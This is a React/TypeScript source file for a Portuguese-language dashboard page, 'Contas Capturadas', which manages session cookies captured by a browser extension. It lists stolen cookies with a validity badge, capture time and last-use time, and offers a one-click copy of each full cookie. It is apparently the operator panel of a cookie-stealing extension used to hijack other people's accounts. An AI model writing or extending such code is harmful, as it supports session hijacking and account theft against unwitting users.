import DashboardLayout from "@/components/DashboardLayout";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { trpc } from "@/lib/trpc";
import { Copy, RefreshCw, Eye, EyeOff } from "lucide-react";
import { useState } from "react";
import { toast } from "sonner";

export default function Accounts() {
  const [anonymousMode, setAnonymousMode] = useState(false);
  
  const { data: accounts, isLoading, refetch } = trpc.accounts.list.useQuery(
    { limit: 50 },
    { refetchInterval: 10000 }
  );

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Cookie copiado para a área de transferência!");
  };

  return (
    <DashboardLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
              Contas Capturadas
            </h1>
            <p className="text-muted-foreground mt-1">
              Gerencie os cookies capturados pela extensão
            </p>
          </div>
          <div className="flex gap-2">
            <Button
              variant={anonymousMode ? "default" : "outline"}
              onClick={() => setAnonymousMode(!anonymousMode)}
              className="gap-2"
            >
              {anonymousMode ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
              {anonymousMode ? "Mostrar Dados" : "Ocultar Dados"}
            </Button>
            <Button
              onClick={() => refetch()}
              variant="outline"
              className="gap-2"
            >
              <RefreshCw className="h-4 w-4" />
              Atualizar
            </Button>
          </div>
        </div>

        {/* Accounts Table */}
        <Card className="border-purple-500/20 bg-card/50 backdrop-blur">
          <CardHeader>
            <CardTitle>Cookies Salvos</CardTitle>
            <CardDescription>
              Últimas 50 contas capturadas
            </CardDescription>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="flex items-center justify-center py-12">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
              </div>
            ) : accounts && accounts.length > 0 ? (
              <div className="rounded-md border border-border overflow-hidden">
                <Table>
                  <TableHeader>
                    <TableRow className="bg-muted/50">
                      <TableHead className="font-semibold">ID</TableHead>
                      <TableHead className="font-semibold">Status</TableHead>
                      <TableHead className="font-semibold">Cookie</TableHead>
                      <TableHead className="font-semibold">Capturado em</TableHead>
                      <TableHead className="font-semibold">Último Uso</TableHead>
                      <TableHead className="font-semibold text-right">Ações</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {accounts.map((account) => (
                      <TableRow key={account.id} className="hover:bg-muted/30 transition-colors">
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          #{account.id}
                        </TableCell>
                        <TableCell>
                          <Badge 
                            variant="outline" 
                            className={
                              account.isValid
                                ? "bg-green-500/10 text-green-400 border-green-500/20"
                                : "bg-red-500/10 text-red-400 border-red-500/20"
                            }
                          >
                            {account.isValid ? "Válido" : "Inválido"}
                          </Badge>
                        </TableCell>
                        <TableCell className="font-mono text-sm max-w-[300px]">
                          {anonymousMode ? (
                            <span className="text-muted-foreground">***************</span>
                          ) : (
                            <div className="flex items-center gap-2">
                              <span className="truncate">
                                {account.cookie.substring(0, 40)}...
                              </span>
                            </div>
                          )}
                        </TableCell>
                        <TableCell className="text-sm">
                          {new Date(account.capturedAt).toLocaleString('pt-BR')}
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground">
                          {account.lastUsedAt 
                            ? new Date(account.lastUsedAt).toLocaleString('pt-BR')
                            : "Nunca"
                          }
                        </TableCell>
                        <TableCell className="text-right">
                          <Button
                            size="sm"
                            variant="ghost"
                            onClick={() => copyToClipboard(account.cookie)}
                            disabled={anonymousMode}
                            className="gap-2"
                          >
                            <Copy className="h-4 w-4" />
                            Copiar
                          </Button>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <p className="text-muted-foreground">
                  Nenhuma conta capturada ainda
                </p>
                <p className="text-sm text-muted-foreground mt-2">
                  As contas aparecerão aqui quando cookies forem capturados
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
}
